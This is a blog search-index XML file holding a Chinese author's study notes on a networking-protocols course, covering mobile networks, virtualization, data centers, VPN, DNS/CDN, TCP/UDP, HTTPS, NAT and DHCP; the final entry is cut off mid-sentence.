<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：23-25讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A23-25%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A23-25%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>移动网络：<br>2G时代上网：1）手机通过无线信号连接基站；2）基站一面接无线，一面接核心网；3）核心网一面接基站请求，判断是否合法等，一面通过网关接电话网络；<br>2.5G网络：在2G的网络基础上加入了分组交换业务；在基站接核心网的组件中，多了分组控制端元，提供分组交换通道；在核心网里面，有个朝前的接待员（SGSN，Service GPRS Supported Node）和朝后连接IP 网络的网关型 GPRS 支持节点（GGSN，Gateway GPRS Supported Node）。<br>3G网络：主要是增加了无线的带宽<br>4G网络：手机直接通过 eNodeB 连接 SGW，连上核心网，SGW 相当于数据面的接待员，并通过PGW 连到 IP 网络。PGW 就是出口网关。在出口网关，有一个组件 PCRF，称为策略和计费控制单元，用来控制上网策略和流量的计费。<br>4G网络协议-控制面协议：一个手机想上网的时候，先要连接 eNodeB，并通过 S1-MME 接口，请求 MME 对这个手机进行认证和鉴权。eNodeB和MME之间使用SCTP协议进行通信。SCTP特点：1）多宿主，引入联合的概念，将多个接口、多条路径放到一个联合中来。当检测到一条路径失效时，协议就会通过另外一条路径来发送通信数据，从而使一台机器支持多个网卡；2）将一个联合分成多个流，一个联合中的所有流都是独立的，但均与该联合相关。每个流都给定了一个流编号，它被编码到 SCTP 报文中，通过联合在网络上传送。3）四次握手，引入cookie概念，防止SYN攻击；4）消息分帧，SCTP 借鉴了 UDP 的机制，在数据传输中提供了消息分帧功能。当一端对一个套接字执行写操作时，可确保对等端读出的数据大小与此相同；5）断开连接是三次挥手，当一端关闭连接时，两端都需关闭。<br>4G网络协议-数据面协议：数据面的协议都是通过 GTP-U，分为乘客协议、隧道协议、承载协议。其中乘客协议是手机发出来的包，IP 是手机的 IP，隧道协议里面有隧道 ID，不同的手机上线会建立不同的隧道，因而需要隧道 ID 来标识。承载协议的 IP 地址是 SGW 和 PGW 的 IP 地址。<br>手机上网过程：1）寻找并发送Attach Request给附近基站eNodeB；2）eNodeB 将请求发给 MME；3）MME 去请求手机，一是认证，二是鉴权，还会请求 HSS 看看有没有钱，看看是在哪里上网；4）认证通过，MME请求SGW创建会话、分配隧道；5）SGW请求PGW创建会话、分配隧道；6）PGW答复，并创建隧道，标记手机请求；7）SGW回复MME会话创建完成，回复隧道ID；8）MME回复eNodeB隧道创建完成，回复隧道ID；9）eNodeB回复MME，自身分给SGW的隧道ID；10）MME 将 eNodeB 给 SGW 分配的隧道 ID  告知 SGW，从而前面的隧道也建设完毕。<br>异地上网问题：异地上网时，手机请求附近的eNodeB，并通过MME去查询国内运营商的HSS，验证用户信息，如果验证通过，手机会与异地的SGW建立隧道，异地的SGW再与国内运营商的PGW建立隧道，由PGW内的PCRF组件计算上网流量，控制上网策略。因此异地上网时，上网策略还是由国内运营商控制的。</p><p>虚拟网卡：通过Linux上的TUN/TAP技术实现<br>虚拟机间通信：在Linux 上通过 brctl命令创建虚拟的网桥 brctl addbr br0。再将两个虚拟机的虚拟网卡，都连接到虚拟网桥 brctladdif br0 tap0 上，这样将两个虚拟机配置相同的子网网段，两台虚拟机就能够相互通信。 虚拟机访问外部：1）桥接：虚拟机和物理机网卡连接在同一个网桥上，使用同一网段，和物理机使用同一个DHCP等服务器；解决了虚拟机间、虚拟机和外部的通信问题，但同一子网内设备过多会引发广播问题；2）NAT：物理机会创建虚拟的DHCP服务器和独立的网桥br0，虚拟机要想访问互联网，需要通过 br0 连到路由器上，然后通过路由器将请求 NAT 成为物理网络的地址，转发到物理网络。<br>虚拟机隔离问题：基于物理网卡，为每个用户用 vconfig 创建一个带 VLAN 的网卡。不同的用户使用不同的虚拟网桥，带 VLAN 的虚拟网卡也连接到虚拟网桥上。</p><p>SDN（软件定义网络）：<br>OpenFlow 是 SDN 控制器和网络设备之间互通的南向接口协议，OpenvSwitch 用于创建软<br>件的虚拟交换机。OpenvSwitch 是支持 OpenFlow 协议的，当然也有一些硬件交换机也支持<br>OpenFlow 协议。它们都可以被统一的 SDN 控制器管理，从而实现物理机和虚拟机的网络连<br>通。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：21-22讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A21-22%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A21-22%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>数据中心：<br> 1、边界路由器（Border Router）：数据中心的入口和出口也是路由器，由于在数据中心的边界，称为边界路由器（Border Router），边界路由器会连接多个运营商网络。<br>2、网卡绑定：多个网卡、多个网线利用LACP（Link Aggregation Control Protocol）协议聚合成一个网卡、一个网线。<br>3、交换机高可用方式：1）使用STD协议连接，形成主备；2）利用堆叠技术，将多个交换机形成一个逻辑交换机，接入层交换机多根线分别连接到多个交换机上，并且通过堆叠的私有协议，形成双活的连接方式。<br>4、可用区：汇聚层将大量的计算节点相互连接在一起，形成一个集群。在这个集群里面，服务器之间通过二层互通，这个区域常称为一个 POD（Point Of Delivery）；<br>5、核心交换机：连接多个可用区的交换机。<br>6、二层设备高可用技术：TRILL（Transparent Interconnection of Lots of Link），即多链接透明互联协议。运行 TRILL 协议的交换机称为 RBridge，是根据mac进行路由转发的网桥设备，可计算最短路径，也可通过等价路由方式进行负载均衡和高可用。</p><p>VPN：<br>VPN，全名 Virtual Private Network，虚拟专用网，就是利用开放的公众网络，建立专用数据传输通道，将远程的分支机构、移动办公人员等连接起来。<br>VPN 通过隧道技术在公众网络上仿真一条点到点的专线，涉及三种协议：乘客协议、隧道协议和承载协议。<br>IPsec VPN，基于 IP 协议的安全隧道协议。具备私密性、完整性、真实性的机制；通过预共享密钥或数字签名的方式确认通信方身份。<br>IKE组件：进行密钥交换；<br>SA组件：进行连接维护；<br>IPsec VPN建立过程：1）使用DH算法计算出对称密钥K；2）建立 IPsec SA，在这个 SA 里面，双方会生成一个随机的对称密钥 M，由 K 加密传给对方，然后使用 M 进行双方接下来通信的数据。对称密钥M具有时效性；IPsec SA 里面有以下内容：<br>SPI（Security Parameter Index），用于标识不同的连接；<br>双方商量好的加密算法、哈希算法和封装模式；<br>生存周期，超过这个周期，就需要重新生成一个 IPsec SA，重新生成对称密钥</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：18-20讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A18-20%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A18-20%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>DNS全局负载均衡过程：<br>1、如客户端访问某域名时（example.com），会先请求本地DNS解析器，本地DNS解析器会查看本地缓存是否有该域名的记录，有则直接使用，无则请求本地DNS服务器；<br>2、本地DNS服务器一般部署在数据中心或者所在运营商网络中，本地DNS服务器查看是否有缓存，若无缓存，则请求根DNS服务器；<br>3、根DNS服务器解析会，会提供管理.com域名的顶级域名服务器地址，本地DNS服务器继续请求该地址；<br>4、顶级域名服务器解析后，则提供管理example.com的权威域名服务器地址，本地DNS服务器继续请求该地址；<br>5、在example.com的权威域名服务器中，一般会以CNAME的方式配置example.com的别名，然后让本地DNS服务器请求GSLB解析这个别名，GSLB 就可以在解析这个域名的过程中，通过自己的策略实现负载均衡，返回给客户端对应的IP地址。</p><p>传统DNS存在的问题：<br>1、域名缓存问题；2、域名转发问题；3、域名更新问题；4、解析延迟问题<br>HttpDNS的工作模式：<br>HttpDNS往往在移动端使用，客户端的SDK动态的请求服务端，获取HttpDNS服务器的IP列表缓存在本地，当手机要请求一个网址时，会优先使用本地缓存，若本地无对应缓存，则请求HttpDNS服务器，由服务器返回要访问的网站的IP列表<br>HttpDNS的缓存设计：<br>HttpDNS 的缓存设计策略分为客户端、缓存、数据源三层。对应手机客户端、DNS缓存、HttpDNS服务器。<br>客户端SDK中的缓存会严格按照缓存过期时间，如果缓存未命中或过期，会发起一次解析，保障记录是最新的；<br>解析分为同步和异步两种方式：<br>1、同步解析：<br>直接调用 HttpDNS 的接口，返回最新的记录，更新缓存；优点是实时性好；缺点是如果有多个请求都发现过期的时候，同时会请求HttpDNS 多次，造成资源浪费；<br>同步更新的方式对应到应用架构中缓存的 Cache-Aside 机制，也即先读缓存，不命中读数据库，同时将结果写入缓存。<br>2、异步解析：<br>添加一个解析任务到后台，由后台任务调用 HttpDNS 的接口；优点是，可以将多个请求都发现过期的情况，合并为一个对于 HttpDNS 的请求任务，只执行一次，减少 HttpDNS 的压力。同时可以在即将过期的时候，就创建一个任务进行预加载，防止过期之后再刷新，称为预加载；缺点是当前请求拿到过期数据的时候，如果客户端允许使用过期数据，则存在过期数据不能访问风险。<br>异步更新的机制对应到应用架构中缓存的 Refresh-Ahead 机制，即业务仅仅访问缓存，当过期的时候定期刷新。<br>HttpDNS调度设计：<br>1、在客户端，客户端的SDK会收集手机的位置、运营商、网络情况等信息，HttpDNS 服务端根据这些信息，选择最佳的服务节点返回。<br>2、在服务端，应用可以通过调用 HttpDNS 的管理接口，配置不同服务质量的优先级、权重。HttpDNS 会根据这些策略综合地理位置和线路状况算出一个排序，优先访问当前那些优质的、时延低的 IP 地址。</p><p>CDN（内容分发网络）：<br>CDN加速意思就是在用户和我们的服务器之间加一个缓存机制，通过这个缓存机制动态获取IP地址根据地理位置，让用户到最近的服务器访问。<br>CDN系统能实时的根据网络流量和各节点的连接，负载状况及用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，其目的是使用户能就近的获取请求数据，解决网络拥堵，提高访问速度，解决由于网络带宽小，用户访问量大，网点分布不均等原因导致的访问速度慢的问题。<br>CDN分发过程：<br>用户向浏览器提供需要访问的域名；</p><p>浏览器调用域名解析库对域名进行解析，由于CDN对域名解析过程进行了调整，所以解析函数库一般得到的是该域名对应的CNAME记录，为了得到实际的IP地址，浏览器需要再次对获得的CNAME域名进行解析以得到实际的IP地址；在此过程中，使用的全局负载均衡DNS解析。如根据地理位置信息解析对应的IP地址，使得用户能就近访问；</p><p>此次解析得到CDN缓存服务器的IP地址，浏览器在得到实际的ip地址之后，向缓存服务器发出访问请求；</p><p>缓存服务器根据浏览器提供的要访问的域名，通过Cache内部专用DNS解析得到此域名的实际IP地址，再由缓存服务器向此实际IP地址提交访问请求；</p><p>缓存服务器从实际IP地址得到内容以后，一方面在本地进行保存，以备以后使用，二方面把获取的数据放回给客户端，完成数据服务过程；</p><p>客户端得到由缓存服务器返回的数据以后显示出来并完成整个浏览的数据请求过程。<br>动态CDN：<br>1、边缘计算模式：定时从源数据那里同步存储的数据，然后在边缘进行计算得到结果。<br>2、路径优化模式：数据的计算在源站生产，数据下发通过CDN网络，并对路径进行优化.</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：16-17讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A16-17%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A16-17%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>流媒体协议<br>视频有客户端上传至服务器在由另一客户端下载播放的流程大致如下：客户端（采样、编码、推流）-服务器（接流、流处理、分发）-客户端（拉流、解码、播放）<br>视频传输过程中，数据量过大，需要进行压缩处理；常用的对视频流中图片的压缩方法有1、空间冗余；2、时间冗余；3、视觉冗余；4、编码冗余。<br>完整的视频流由很多帧图片组成，每一帧又分成多个片，每个片的信息都使用一个网络提取层单元（NALU）保存，最终组成一个NALU序列，为传输做准备<br>排列好的二进制流需要使用基于TCP的RTMP协议进行分块传输<br>当视频流推送到客户端时，客户端再通过RTMP协议拉取数据，读取chunk中的message，组合为NALU序列，再解码成视频格式播放</p><p>P2P协议<br>下载一个文件有HTTP和FTP两种方式，但这两种都是集中下载的方式，而 P2P 则换了一种思路，采取非中心化下载的方式；<br>P2P 两种，一种是依赖于 tracker 的，也即元数据集中，文件数据分散；另一种是基<br>于分布式的哈希算法，元数据和文件数据全部分散。<br>依赖tracker ：<br>下载时，BT 客户端首先解析.torrent 文件得到 tracker 地址，再由 tracker 服务器将其他下载者（包括发布者）的 IP 提供给下载者。下载者再连接其他下载者，根据.torrent 文件，两者分别对方告知自己已经有的块，然后交换对方没有的数据。此时不需要其他服务器参与，并分散了单个线路上的数据流量，因此减轻了服务器的负担。<br>去中心化网络（DHT）：<br>Kademlia 协议是著名的DHT协议，在 DHT 网络里面，每一个 DHT node 都有一个 ID。这个 ID 是一个很长的串。每个 DHT node 都有责任掌握一些知识，也就是文件索引，每个 DHT node 使用哈希算法计算出需要保存的文件索引。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：10-13讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A10-13%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A10-13%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>总结/思考：<br>UDP协议<br>UDP协议的首部有8个字节，一共四个字段，每个字段的长度都是2个字节，16比特（位）。<br>UDP 特点<br>1、无连接：UDP是无连接的协议，他在进行数据传输之前不需要先建立连接，也没有各种重传机制、拥塞控制和流量控制，所以传输速度很快，消耗很低，延迟小，数据传输效率高，适合对可靠性要求不高的应用程序，或者可以保障可靠性的应用程序，如DNS、TFTP、SNMP等。<br>2、不可靠：只负责数据的发送，不关心数据是否送达，没有确认机制，主机收到数据也不会有响应<br>3、分组首部开销小，TCP的首部是20字节，UDP的首部是8字节<br>4、面向报文的：TCP(面向连接的传输控制协议)是面向字节传输，而UDP是面向报文传输，对于应用层交下来的报文段不进行拆分合并，直接保留原有报文段的边界然后添加UDP的首部就交付给网络层。不论报文的长短，UDP都不会进行处理。因此为了避免报文段过短降低传输效率以及报文段过长导致网络层对IP数据进行分片操作，应用层应该选择合适长度的报文交付给运输层的UDP。</p><p>TCP协议<br>TCP 用于从应用程序到网络的数据传输控制。<br>TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。<br>是面向连接的、可靠的、基于字节流的传输层通信协议。<br>TCP 特点<br>1、点对点（不能广播、多播），面向连接<br>2、双向传递（全双工）<br>3、字节流：打包成报文段、保证有序接收、重复报文自动丢弃<br>     缺点：不维护应用报文的边界（需要HTTP协议自己定义/r/n或content length进行结尾、GRPC）<br>     优点：不强制要求应用必须离散的创建数据块，不限制数据块大小<br>4、流量缓存：解决速度不匹配问题（滑动窗口）<br>5、可靠的传输服务（保证可达，丢包时通过重发进而增加时延实现可靠性）<br>6、拥塞控制</p><p>MSS：Max Segment Size<br>定义：仅指TCP承载数据，不包含TCP头部大小，参见RFC879<br>MSS选择目的：<br>尽量每个Segment报文段携带更多的数据，以减少头部空间占用比率<br>防止Segment被某个设备的IP层基于MTU拆分<br>默认MSS：536字节（标准默认MTU576字节，20字节IP头部，20字节TCp头部）</p><p>滑动窗口<br>是TCP流量控制的一个手段。这里说的窗口，指的是接收通告窗口（Receiver Window，RWND）。它告诉对方本端的TCP接收缓冲区还能容纳多少字节的数据，这样对方就可以控制发送数据的速度。</p><p>拥塞控制<br>拥塞控制包含四个方式：慢启动、拥塞避免、快速重传和快速恢复，用于应对通信网络环境差时的丢包问题<br>丢包情况严重时采用慢启动+拥塞避免方式；当丢包情况不严重时，可进行快速重传和快速恢复方式；不一定会进入慢启动状态.</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：14-15讲</title>
    <link href="/2020/09/26/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A14-15%E8%AE%B2/"/>
    <url>/2020/09/26/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A14-15%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="HTTP请求格式"><a href="#HTTP请求格式" class="headerlink" title="HTTP请求格式"></a>HTTP请求格式</h3><p>HTTP的报文主要分为1、请求行；2、请求首部；3、请求体</p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>HTTP请求行中包含请求方法（GET、POST、PATCH等）、URL、和HTTP版本</p><h4 id="首部字段"><a href="#首部字段" class="headerlink" title="首部字段"></a>首部字段</h4><p>首部字段用K：V方式表示；如我们请求一个网站，服务器给我们返回等应答中头部字段；客户端同样可以构造<br>请求头部字段<br>accept-ranges: bytes<br>access-control-allow-origin: *<br>age: 3035367<br>cache-control: max-age=31536000<br>content-length: 8035<br>content-type: image/png</p><h4 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a>请求体</h4><p>请求等实体内容</p><h3 id="HTTP返回格式"><a href="#HTTP返回格式" class="headerlink" title="HTTP返回格式"></a>HTTP返回格式</h3><p>HTTP响应报文主要包括1、状态行；2、首部；3、响应实体</p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>状态行包括HTTP版本、状态码、和描述响应结果等短语，如“ok”</p><h4 id="首部和响应实体"><a href="#首部和响应实体" class="headerlink" title="首部和响应实体"></a>首部和响应实体</h4><p>首部和响应实体与请求报文意义一样</p><h3 id="QUIC协议"><a href="#QUIC协议" class="headerlink" title="QUIC协议"></a>QUIC协议</h3><p>QUIC 协议通过基于 UDP 自定义的类似 TCP 的连接、重试、多路复用、流量控制技术，进<br>一步提升性能。</p><h3 id="HTTP-加密传输"><a href="#HTTP-加密传输" class="headerlink" title="HTTP 加密传输"></a>HTTP 加密传输</h3><p>HTTP在网络中是以明文方式传输等，存在中间人攻击等安全隐患，为确保安全需要采用加密传输，目前加密方式分为对称加密和非对称加密两种</p><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><p>客户端和服务端使用同一个密钥加解密数据，但是密钥等传输一般只能通过线下传输，在客户端多等情况下，一对一为客户端提供密钥就不太实际<br>####非对称加密<br>客户端和服务端都有各自等公钥和私钥。同时客户端提供自己等公钥给服务端，客户端和服务端向彼此发送数据时，都是使用对方等公钥进行加密，这样就只有对方才具备私钥解密数据。采用客户端向服务端提供公钥的方式可以解决密钥传输的问题</p><h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p>由权威机构对公钥进行认证，颁发证书，证书一般包含公钥、证书所有者信息、证书发布机构和证书有效期等信息，用于加强公钥等可信度。</p><h3 id="HTTPS工作方式"><a href="#HTTPS工作方式" class="headerlink" title="HTTPS工作方式"></a>HTTPS工作方式</h3><p>建立HTTPS连接时：<br>1、客户端：以明文传输 TLS 版本信息、加密套件候选列表、压缩算法候选列表等信息和一个随机数（在协商对称密钥的时候使用）给服务端<br>2、服务端：向客户端发送服务器选择使用的协议版本、加密套件、压缩算法等和一个随机数（用于后续的密钥协商）;以及服务端的证书<br>3、客户端：验证服务端证书，验证证书可信后，客户端计算产生随机数字 Pre-master，发送 Client Key Exchange，用证书中的公钥加密，再发送给服务器，服务器可以通过私钥解密<br>客户端还是服务器，都有了三个随机数，分别是：自己的、对端的，以及刚生成的 Pre-Master 随机数。通过这三个随机数，可以在客户端和服务器产生相同的对称密钥。<br>后续的数据传输便使用对称密钥加密<br>HTTPS采用非对称加密的方式传输密钥，对称加密的方式传输数据，解决了密钥传输的安全问题，同时也提高了数据传输的效率。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：5-9讲</title>
    <link href="/2020/09/06/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A5-9%E8%AE%B2/"/>
    <url>/2020/09/06/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A5-9%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="总结-思考："><a href="#总结-思考：" class="headerlink" title="总结/思考："></a>总结/思考：</h3><p>第8讲中关于NAT的映射讲的比较模糊，没有讲明从公网访问过来的包怎么准确的NAT到对应的内外IP上，自行google了NAT的原理，做下总结：</p><h3 id="NAT（IP-Network-Address-Translator）"><a href="#NAT（IP-Network-Address-Translator）" class="headerlink" title="NAT（IP Network Address Translator）"></a>NAT（IP Network Address Translator）</h3><h4 id="NAT技术使用原因和场景"><a href="#NAT技术使用原因和场景" class="headerlink" title="NAT技术使用原因和场景"></a>NAT技术使用原因和场景</h4><p>原因：公务IP数量少，主机数量多，无法给每个主机都分配一个公网IP，因此就需要多台内网主机共享一个公网IP。<br>使用场景：<br>1）内网中主要用于客户端访问互联网<br>2）同一时间仅少量主机访问互联网<br>3）内网中存在一个路由器负责访问外网</p><h4 id="单向（向外）转换NAT：动态映射"><a href="#单向（向外）转换NAT：动态映射" class="headerlink" title="单向（向外）转换NAT：动态映射"></a>单向（向外）转换NAT：动态映射</h4><p>同一时间内仅有少量主机可访问公网，路由器为这些内网主机临时配置1对1的公网IP-内网IP映射关系；<br>存在问题：同一时间访问公网的主机数量多时，就需要对应数量的公网IP了。</p><h4 id="双向（向内）NAT：IP地址静态映射"><a href="#双向（向内）NAT：IP地址静态映射" class="headerlink" title="双向（向内）NAT：IP地址静态映射"></a>双向（向内）NAT：IP地址静态映射</h4><p>使用场景：当公网主机想主动访问一个内网IP的时候，单向NAT和NAPT技术都无法实现，只能依靠双向NAT技术；<br>原理：NAT路由器会将内网IP和出口公网IP做一个静态都映射记录，访问出口公网IP都将映射都内网IP上。<br>缺点：无法使用端口映射，使用场景较少。</p><h3 id="NAPT端口映射（Network-Address-Port-Translation）"><a href="#NAPT端口映射（Network-Address-Port-Translation）" class="headerlink" title="NAPT端口映射（Network Address Port Translation）"></a>NAPT端口映射（Network Address Port Translation）</h3><p>原理：如本地电脑访问知乎，本地客户端会和知乎服务器建立一个TCP连接，操作系统使用如7000端口和本机IP（172.18.68.69）作为源IP端口，目的IP端口为103.41.167.234:80；NAT路由器则会把源IP映射为路由器上出口的公网IP194.54.21.7，并将源端口修改为一个随机的如7224端口（这里路由器修改了传输层的数据），发送往服务器，再服务器发回数据包后，在通过映射记录，修改发往本地的目的IP和端口，从而实现多台主机公用一个公网IP。</p><h3 id="NAT技术优缺点"><a href="#NAT技术优缺点" class="headerlink" title="NAT技术优缺点"></a>NAT技术优缺点</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>共享公共IP地址，节约开支<br>扩展主机时不涉及公共地址<br>更换ISP服务商不会对主机地址产生影响<br>更好都安全性，外网服务无法主动访问内网服务<br>更好都隔离性</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><p>网络管理复杂<br>性能下降，每个数据包都要进行源/目IP端口都修改<br>重新修改校验和，因为数据包内容被修改<br>客户端缺乏公网IP导致一些功能缺失</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>NAT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：1-4讲</title>
    <link href="/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/"/>
    <url>/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="总结-思考："><a href="#总结-思考：" class="headerlink" title="总结/思考："></a>总结/思考：</h3><p>第四讲中关于DHCP的具体实现过程讲的比较抽象，于是上网google了一下具体的流程</p><h4 id="DHCP的实现"><a href="#DHCP的实现" class="headerlink" title="DHCP的实现"></a>DHCP的实现</h4><p>DHCP实现大致分为4步<br>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。<br>数据包内容：Client端使用IP地址0.0.0.0发送一个目的IP地址位255.255.255.255的广播包，使用的协议为UDP协议。</p><p>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。<br>数据包内容：<br>（1）DHCP服务器仍然使用广播地址作为目的地址，因为此时请求分配IP的Client并没有自己ip,而可能有多个Client在使用0.0.0.0这个IP作为源IP向DHCP服务器发出IP分配请求，DHCP也不能使用0.0.0.0这个IP作为目的IP地址，于是依然采用广播的方式，告诉正在请求的Client们，这是一台可以使用的DHCP服务器。<br>（2）DHCP服务器提供了一个可用的IP,在数据包的Your (client) IP Address字段可以看到DHCP服务器提供的可用IP。<br>（3）除此之外，如图中红色矩形框的内容所示，服务器还发送了子网掩码，路由器，DNS，域名，IP地址租用期等信息。</p><p>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。<br>数据包内容：当Client收到了DHCP Offer包以后（如果有多个可用的DHCP服务器，那么可能会收到多个DHCP Offer包），确认有可以和它交互的DHCP服务器存在，于是Client发送Request数据包，请求分配IP。<br>此时的源IP和目的IP依然是0.0.0.0和255.255.255.255。包中包含客户端的MAC地址、接受的租约中的IP地址、提供此租约的DHCP服务器地址等）。告诉所有DHCP服务器它将接受哪一台服务器（一般是最先到达的server）提供的IP地址，所有其他的DHCP服务器撤销它们的提供以便将IP地址提供给下一次IP租用请求。</p><p>第四步：DHCP Server发送ACK数据包，确认信息。<br>数据包内容：在数据包中包含以下信息，表示将这些资源信息分配给Client.<br>Your(client) IP address:分配给Client的可用IP。<br>后面有许多项option信息，前两项是DHCP服务器发送的消息类型（ACK）和服务器的身份标识，后面几项是：<br>Subnet Mask:Client端分配到的IP的子网掩码；<br>Router:路由器<br>Domain Name Server:DNS,域名服务器<br>Domain Name:域名<br>IP Address Lease Time:IP租用期。</p><p>后续：客户端在接收到DHCP ack广播后，会向网络发送三个针对此IP地址的ARP解析请求以执行冲突检测，查询网络上有没有其它机器使用该IP地址；如果发现该IP地址已经被使用，客户机会发出一个DHCP decline数据包给DHCP服务器，拒绝此IP地址租约，并重新发送DHCP 